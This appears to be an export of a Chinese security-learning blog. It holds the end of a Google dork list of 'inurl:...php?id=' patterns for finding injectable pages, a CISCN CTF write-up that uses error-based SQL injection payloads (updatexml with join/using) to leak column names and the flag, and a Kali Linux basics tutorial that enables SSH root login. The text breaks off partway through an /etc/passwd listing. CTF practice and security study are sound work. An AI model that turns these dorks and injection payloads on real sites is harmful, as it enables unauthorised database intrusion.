<li><input disabled="" type="checkbox"> <p>inurl:newsDetail.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:ogl_inet.php?ogl_id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:viewshowdetail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:gallery.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:fiche_spectacle.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:clubpage.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:article.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:communique_detail.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:memberInfo.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:show.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:sem.php3?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:section.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:staff_id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:kategorie.php4?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:theme.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:newsitem.php?num=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:news.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:page.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:readnews.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:index.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:shredder-categories.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:top10.php?cat=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:faq2.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:tradeCategory.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:historialeer.php?num=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:show_an.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:product_ranges_view.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:reagir.php?num=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:preview.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:shop_category.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:Stray-Questions-View.php?num=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:loadpsb.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:transcript.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:forum_bds.php?num=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:opinions.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:channel_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:game.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:spr.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:aboutbook.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:view_product.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:pages.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:preview.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:newsone.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:announce.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:loadpsb.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:sw_comment.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:clanek.php4?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:pages.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:news.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:participant.php?id= </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:avd_start.php?avd=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:download.php?id= </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:event.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:main.php?id= </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:product-item.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:review.php?id= </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:sql.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:chappies.php?id= </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:material.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:read.php?id= </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:clanek.php4?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:prod_detail.php?id= </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:announce.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:viewphoto.php?id= </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:chappies.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:article.php?id= </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:read.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:person.php?id= </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:viewapp.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:productinfo.php?id= </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:viewphoto.php?id=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:showimg.php?id= </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:rub.php?idr=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:view.php?id= </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:galeri_info.php?l=    </p>
</li>
<li><input disabled="" type="checkbox"> <p>inurl:website.php?id=</p>
</li>
</ul>
]]></content>
      <categories>
        <category>黑客工具</category>
      </categories>
      <tags>
        <tag>谷歌语法</tag>
      </tags>
  </entry>
  <entry>
    <title>第十四届全国大学生CTF比赛</title>
    <url>/posts/72.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><hr>
<h1 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h1><blockquote>
<p>1、通过报错注入获取flag的字段名id</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">1&#39;) or updatexml(0x2e,concat(0x2e,(select * from(select * from flag as a join flag b)c)),0x2e)#</span><br></pre></td></tr></table></figure></div>



<blockquote>
<p>2、通过的方式获取flag的字段名no</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">1&#39;) or updatexml(0x2e,concat(0x2e,(select * from(select * from flag as a join flag b using(id))c)),0x2e)#</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>3、在获取id及之后字段名no字段名’b803ed64-14a9-474f-9832-b854b23d3014’</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">1&#39;) or updatexml(0x2e,concat(0x2e,(select * from(select * from flag as a join flag b using(id,no))c)),0x2e)#</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>4、通过字段名获取flag的一部分</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">需要将单引号该成反引号</span><br><span class="line">&#96;b803ed64-14a9-474f-9832-b854b23d3014&#96;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">1&#39;) or updatexml(0x2e,concat(0x2e,(select &#96;b803ed64-14a9-474f-9832-b854b23d3014&#96; from flag)),0x2e)#</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">TH syntax error: &#39;CISCN&#123;z9ZeE-peOfv-Wemp4-GE5FV-51&#39;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>5、通过substring(str,10,20)这个函数进行后半部分显示</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">1&#39;) or updatexml(0x2e,concat(0x2e,(select substring(&#96;b803ed64-14a9-474f-9832-b854b23d3014&#96;,10,20) from flag)),0x2e)#</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">TH syntax error: &#39;eE-peOfv-Wemp4-GE5FV&#39;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>5、通过substring(str,20,30)这个函数进行后半部分显示</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">1&#39;) or updatexml(0x2e,concat(0x2e,(select substring(&#96;b803ed64-14a9-474f-9832-b854b23d3014&#96;,20,30) from flag)),0x2e)#</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">TH syntax error: &#39;emp4-GE5FV-51yUy-&#125;&#39;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>6、删除重复部分</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">第一部分</span><br><span class="line">TH syntax error: &#39;CISCN&#123;z9ZeE-peOfv-Wemp4-GE5FV-51&#39;</span><br><span class="line">第二部分</span><br><span class="line">TH syntax error: &#39;eE-peOfv-Wemp4-GE5FV&#39;</span><br><span class="line">第三部分</span><br><span class="line">TH syntax error: &#39;emp4-GE5FV-51yUy-&#125;&#39;</span><br><span class="line"></span><br><span class="line">删除重复部分</span><br><span class="line">得出答案</span><br><span class="line">CISCN&#123;z9ZeE-peOfv-Wemp4-GE5FV-51yUy-&#125;</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>【kali linux】基础知识</title>
    <url>/posts/114.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="认识linux"><a href="#认识linux" class="headerlink" title="认识linux"></a>认识linux</h1><h2 id="SHELL和终端"><a href="#SHELL和终端" class="headerlink" title="SHELL和终端"></a>SHELL和终端</h2><blockquote>
<p>查看shells：  cat /etc/shells</p>
<p>查看当前shell   ：  echo $SHELL  linux区分大小写</p>
</blockquote>
<h2 id="vim编译器"><a href="#vim编译器" class="headerlink" title="vim编译器"></a><strong>vim编译器</strong></h2><blockquote>
<p>VM编辑器是所有unix及linux系统下标准的编辑器。</p>
</blockquote>
<p><strong>vi/vim编辑器模式</strong></p>
<blockquote>
<p><strong>命令模式</strong>：刚进入vim的时候，默认就是命令模式，可以复制行，删除行等。</p>
<p><strong>输入模式</strong>：可以输入内容</p>
<p>输入模式 -&gt; 命令模式  快键键 ESC键</p>
<p><strong>关闭、保存文件</strong><br><strong>冒号“：”开头</strong><br><strong>命令模式下</strong>：</p>
<p>w: 保存<br>q:退出<br>wq和x都是保存退出<br>q! :强制退出<br>w!: 强制保存，管理员才有权限</p>
<p><strong>例如      :q!</strong></p>
<p><strong>查找</strong><br>普通模式：<br>/PATTERN: 从当前位置向后查找<br>?PATTERN: 从当前位置向前查找</p>
<p><strong>模式转换</strong><br>使用insert键切换进输入模式<br><strong>命令模式 -&gt; 输入模式</strong>：</p>
<p><strong>i：在当前光标所在字符的前面，转换为输入模式</strong><br><strong>I：在当前光标所在行的行首转换为输入模式</strong><br><strong>a：在当前光标所在字符的后面，转换为输入模式</strong><br><strong>A：在当前光标所在行的行尾，转换为输入模式</strong><br><strong>o：在当前光标所在行的下方，新建一行，并转为输入模式</strong><br><strong>O：在当前光标所在行的上方，新建一行，并转为输入模式</strong><br><strong>s：删除光标所在字符</strong><br><strong>r：替换光标处字符</strong></p>
</blockquote>
<h1 id="Linux常用命令"><a href="#Linux常用命令" class="headerlink" title="Linux常用命令"></a>Linux常用命令</h1><blockquote>
<p><strong>echo命令</strong>： echo $SHELL<br>echo命令用于在终端输出字符串或变量提取后的值</p>
<p><strong>date命令</strong><br>date命令用于显示及设置系统的时间或日期</p>
<p>poweroff命令<br>poweroff命令用于关闭系统</p>
<p>top命令<br>显示当前系统正在执行的进程的相关信息，包括进程id、内存占用率等</p>
</blockquote>
<h2 id="系统检测命令"><a href="#系统检测命令" class="headerlink" title="系统检测命令"></a>系统检测命令</h2><blockquote>
<p><strong>ifconfig命令</strong><br>ifconfig命令用于获取网卡配置与网络状态等信息</p>
<p>*<em>uname命令 *</em> : uname -a<br>uname命令用于查看系统内核与系统版本等信息</p>
<p><strong>who命令</strong><br>who用于查看当前登入主机的用户终端信息</p>
<p><strong>history命令</strong> : history<br>history命令用于显示历史执行过的命令</p>
</blockquote>
<h2 id="工作目录切换命令"><a href="#工作目录切换命令" class="headerlink" title="工作目录切换命令"></a>工作目录切换命令</h2><blockquote>
<p><strong>pwd命令</strong><br>pwd命令用于显示用户当前所处的工作目录</p>
<p><strong>cd命令</strong><br>cd命令用于切换工作路径</p>
<p><strong>ls命令</strong><br>ls命令用于显示目录中的文件信息</p>
</blockquote>
<h1 id="了解VMware网络基本配置"><a href="#了解VMware网络基本配置" class="headerlink" title="了解VMware网络基本配置"></a>了解VMware网络基本配置</h1><blockquote>
<p>briged（桥接模式）：虚拟机和主机好比在同一个网络环境下的两台电脑</p>
<p>Nat（网络地址转换模拟）：NAT模式虚拟机通过主机进行联网。</p>
<p>Host-Only（主机模式）：主机模式将虚拟机与外网隔开，只能让虚拟机和虚拟机之间联网</p>
</blockquote>
<h1 id="kali的更新"><a href="#kali的更新" class="headerlink" title="kali的更新"></a>kali的更新</h1><h2 id="一句话更新"><a href="#一句话更新" class="headerlink" title="一句话更新"></a>一句话更新</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">root@kali:~# apt update &amp;&amp; apt full-upgrade</span><br></pre></td></tr></table></figure></div>

<p><strong>如何查看自己的Kali Linux是否更新成功？更新到最新版本？</strong>重启后，用如下命令：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">root@kali:~# grep VERSION &#x2F;etc&#x2F;os-release</span><br><span class="line">VERSION&#x3D;&quot;2019.1&quot;</span><br><span class="line">VERSION_ID&#x3D;&quot;2019.1&quot;</span><br><span class="line">root@kali:~#</span><br><span class="line">root@kali:~# uname -a</span><br><span class="line">Linux kali 4.19.0-kali1-amd64 #1 SMP Debian 4.19.13-1kali1 (2019-3-18) x86_64 GNU&#x2F;Linux</span><br></pre></td></tr></table></figure></div>

<h2 id="系统源"><a href="#系统源" class="headerlink" title="系统源"></a>系统源</h2><p><strong>源配置（软件源）概念</strong>：源就是来源。就是你安装软件时，程序从哪里获取软件包（安装程序在你的机器上，但需要安装的东西却在软件源服务器上）。其实你可以把它称为<strong>软件仓库</strong>。安装软件时，就是从仓库里面调取数据放在你的机器上。</p>
<h2 id="Linux下载软件的两种方式："><a href="#Linux下载软件的两种方式：" class="headerlink" title="Linux下载软件的两种方式："></a>Linux下载软件的两种方式：</h2><blockquote>
<p>1、<strong>从源配置（软件源）所在服务器上通过特定命令获取JDK，Tomcat之类的软件包</strong></p>
<p>2、<strong>从官网上下载软件包</strong></p>
</blockquote>
<p><strong>第一次更新源的过程就相当于我们刚装好windows系统需要打补丁</strong></p>
<blockquote>
<p>1、查看当前系统中所有软件包状态<br>sudo dpkg –get-selections | more<br>可以找到metasploit-framework软件包名为”metasploit-framework”</p>
<p>2、给metasploit-framework锁定当前版本不更新<br>sudo apt-mark hold metasploit-framework</p>
<p>3、查看当前已锁定的软件包<br>sudo dpkg –get-selections | grep hold</p>
<p>4、取消软件保留设置<br>sudo apt-mark unhold metasploit-framework</p>
</blockquote>
<h2 id="配置kali系统更新源"><a href="#配置kali系统更新源" class="headerlink" title="配置kali系统更新源"></a>配置kali系统更新源</h2><blockquote>
<p>1、使用编译器打开系统源文本</p>
<p>leafpad /etc/apt/sources.list   </p>
</blockquote>
<blockquote>
<p>2、可以更改更新源</p>
<p>deb <a href="http://mirrors.ustc.edu.cn/kali" target="_blank" rel="noopener">http://mirrors.ustc.edu.cn/kali</a> kali-rolling main non-free contrib<br>deb-src <a href="http://mirrors.ustc.edu.cn/kali" target="_blank" rel="noopener">http://mirrors.ustc.edu.cn/kali</a> kali-rolling main non-free contrib</p>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210826153007770.png" alt="image-20210826153007770"></p>
<blockquote>
<p>3、使用更新命令</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">apt-get updata &amp;&amp; apt-get upgrade &amp;&amp; apt-get dist-upgrade</span><br></pre></td></tr></table></figure></div>

<h2 id="kali系统更新后出现的问题"><a href="#kali系统更新后出现的问题" class="headerlink" title="kali系统更新后出现的问题"></a>kali系统更新后出现的问题</h2><p><strong>如果metasploit-framework无法启动</strong></p>
<p>进入<strong>cd  /usr/share/metasploit-framework</strong>目录下<br>使用命令</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">gem install bundler</span><br><span class="line">gem update --system</span><br></pre></td></tr></table></figure></div>

<p>然后成功启动</p>
<h2 id="SSH服务简介"><a href="#SSH服务简介" class="headerlink" title="SSH服务简介"></a>SSH服务简介</h2><blockquote>
<p><strong>SHH是标准的网络协议，默认22号端口，采用密文的形式在网络中传输数据，相对于通过明文传输的telnet，更具有更高的安全性</strong></p>
<p><strong>SSH服务目前较可靠，专为远程登录服务器和其他网络服务提供安全性的协议</strong></p>
<p><strong>SSH提供了口令和密钥两种用户验证方式，这两者都是通过密文传输数据的。</strong></p>
<p><strong>SSH对我们主要的作用是：能够操作远程服务器系统</strong></p>
</blockquote>
<h2 id="kali配置SSH服务和windows配置SSH服务"><a href="#kali配置SSH服务和windows配置SSH服务" class="headerlink" title="kali配置SSH服务和windows配置SSH服务"></a><strong>kali配置SSH服务和windows配置SSH服务</strong></h2><blockquote>
<p><strong>1、使用编辑器打开ssh配置</strong></p>
<p><strong>leafpad /etc/ssh/sshd_config</strong></p>
<p><strong>搜索：</strong><br><strong>#PasswordAuthentication yes  去掉注释</strong><br><strong>#PermitRootLogin prohibit-password   去掉注释并改为PermitRootLogin yes</strong>  </p>
<p><strong>2、使用命令行模式开启SSH服务</strong><br><strong>service ssh start</strong></p>
<p><strong>3、查看服务开启状态</strong><br><strong>service ssh status</strong></p>
<p><strong>3、登陆测试</strong><br><strong>使用</strong></p>
<p><strong>xshell</strong>蓝奏云： <a href="https://wwr.lanzous.com/b0262213c" target="_blank" rel="noopener">https://wwr.lanzous.com/b0262213c</a> 密码:9hm1</p>
<p><strong>putty</strong>蓝奏云：[<a href="https://wwr.lanzous.com/ib2cio96gxi" target="_blank" rel="noopener">https://wwr.lanzous.com/ib2cio96gxi</a>   52pj</p>
<p>openssh使用windows自带命令窗口连接：<a href="https://www.mls-software.com/opensshd.html" target="_blank" rel="noopener">https://www.mls-software.com/opensshd.html</a></p>
<p><strong>使用方法</strong></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210618100927656.png" alt="image-20210618100927656"></p>
<p><strong>等工具测试</strong></p>
<ul>
<li><p>windows配置ssh服务</p>
<ul>
<li><p>下载地址：<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FPowerShell%2FWin32-OpenSSH%2Freleases" target="_blank" rel="noopener">https://github.com/PowerShell/Win32-OpenSSH/releases</a> </p>
</li>
<li><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210618111728037.png" alt="image-20210618111728037"></p>
</li>
<li><p>安装SSH服务</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">powershell.exe -ExecutionPolicy Bypass -File install-sshd.ps1</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210618111751408.png" alt="image-20210618111751408"></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210618111807807.png" alt="image-20210618111807807"></p>
</li>
</ul>
</li>
</ul>
</blockquote>
<h1 id="Kali工具包简介"><a href="#Kali工具包简介" class="headerlink" title="Kali工具包简介"></a>Kali工具包简介</h1><p>kali linux 含有可用于渗透测试的工具</p>
<blockquote>
<p>信息收集：这类工具主要用来帮助我们收集目标的网站架构、网站脚本语言、网站信息泄露</p>
<p>漏洞评估：这类工具可以扫描目标系统上的漏洞，扫描主机漏洞，系统漏洞</p>
<p>漏洞利用：这类工具可以利用在目标系统中发现的漏洞，让我们针对性的去利用攻击</p>
<p>Web应用：即与web应用有关的工具，关于web方面的扫描器、爆破等工具</p>
<p>密码攻击：提供在线密码破解或者是离线的密码破解工具给我们使用</p>
</blockquote>
<h1 id="Linux常用命令-1"><a href="#Linux常用命令-1" class="headerlink" title="Linux常用命令"></a>Linux常用命令</h1><h2 id="文本文件编辑命令"><a href="#文本文件编辑命令" class="headerlink" title="文本文件编辑命令"></a>文本文件编辑命令</h2><blockquote>
<p><strong>cat命令</strong><br>cat命令用于查看纯文本文件（内容较少的）</p>
<p><strong>more命令</strong><br>more命令用于查看纯文本文件（内容较多的）</p>
<p><strong>ls命令</strong><br>查看当前目录</p>
<p><strong>head命令</strong><br>head命令用于查看纯文本文档的前N行</p>
<p><strong>wc命令</strong><br>wc命令用于统计指定文本的行数、字数、字节数</p>
<p><strong>stat命令</strong>： stat nmap.txt<br>stat命令用于查看文件的具体存储信息和时间等信息</p>
<p><strong>touch命令</strong>： touch –help    touch -a 05011001 nmap.txt<br>touch命令用于创建空白文件或设置文件的时间</p>
<p><strong>mkdir命令</strong><br>mkdir命令用于创建空白的目录</p>
<p><strong>cp命令</strong><br>cp命令用于复制文件或目录</p>
<p><strong>mv命令</strong><br>mv命令用于移动文件或将文件重命名</p>
<p><strong>file命令</strong><br>file命令用于查看文件的类型</p>
<p><strong>tar命令</strong><br>tar命令用于对文件进行打包压缩或解压</p>
<p><strong>find命令</strong><br>find命令用于按照指定条件来查找文件</p>
<p><strong>rm命令</strong><br>用于删除文件或者文件夹，删除文件夹要用-r -f</p>
<p><strong>wget命令</strong>： wget <a href="http://linux.51yip.com/images/logo.png" target="_blank" rel="noopener">http://linux.51yip.com/images/logo.png</a><br>wget命令用于下载</p>
</blockquote>
<h2 id="文件管理权限命令"><a href="#文件管理权限命令" class="headerlink" title="文件管理权限命令"></a>文件管理权限命令</h2><blockquote>
<p><strong>chmod</strong></p>
<p>文件和目录的权限<br>linux中文件和目录的权限有所不同<br>文件的权限<br>r 可以读文件 数值为4<br>w 可以写文件  2<br>x  可以执行文件 1</p>
</blockquote>
<h1 id="用户-用户组"><a href="#用户-用户组" class="headerlink" title="用户/用户组"></a>用户/用户组</h1><blockquote>
<p>在Linux中，每个文件都是属于一个用户的，每一个用户都属于一个用户组</p>
<p>可以同时拥有N多个用户，和用户组</p>
</blockquote>
<h2 id="保存用户信息"><a href="#保存用户信息" class="headerlink" title="保存用户信息"></a>保存用户信息</h2><blockquote>
<p>用户信息：cat /etc/passwd</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;usr&#x2F;bin&#x2F;zsh</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_apt:x:100:65534::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-timesync:x:101:101:systemd Time Synchronization,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-network:x:102:103:systemd Network Management,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-resolve:x:103:104:systemd Resolver,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mysql:x:104:110:MySQL Server,,,:&#x2F;nonexistent:&#x2F;bin&#x2F;false</span><br><span class="line">tss:x:105:111:TPM software stack,,,:&#x2F;var&#x2F;lib&#x2F;tpm:&#x2F;bin&#x2F;false</span><br><span class="line">strongswan:x:106:65534::&#x2F;var&#x2F;lib&#x2F;strongswan:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">ntp:x:107:113::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">messagebus:x:108:114::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">redsocks:x:109:115::&#x2F;var&#x2F;run&#x2F;redsocks:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">rwhod:x:110:65534::&#x2F;var&#x2F;spool&#x2F;rwho:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">iodine:x:111:65534::&#x2F;run&#x2F;iodine:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span 